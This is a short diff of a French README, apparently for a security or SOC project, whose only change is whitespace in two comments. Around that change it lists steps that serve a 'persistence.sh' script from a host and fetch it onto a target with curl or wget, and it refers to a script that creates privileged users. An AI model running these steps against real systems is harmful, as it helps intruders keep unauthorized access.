@@ -66,9 +66,9 @@ Vous pouvez également mettre le chemin d'une clé USB/disque.
  Depuis Github : https://github.com/NoorXmnr/Soc-project/blob/main/Cr%C3%A9ation%20d'utilisateurs%20avec%20privil%C3%A9ges.sh
  
  Depuis le réseau local : 
- # Host:
+ #Host:
 sh persistence.sh -w
-# Target:
+#Target:
 curl -LJO <Host>:8000/persistence.sh #or
 curl <Host>:8000/persistence.sh > persistence.sh #or
 wget <Host>:8000/persistence.sh
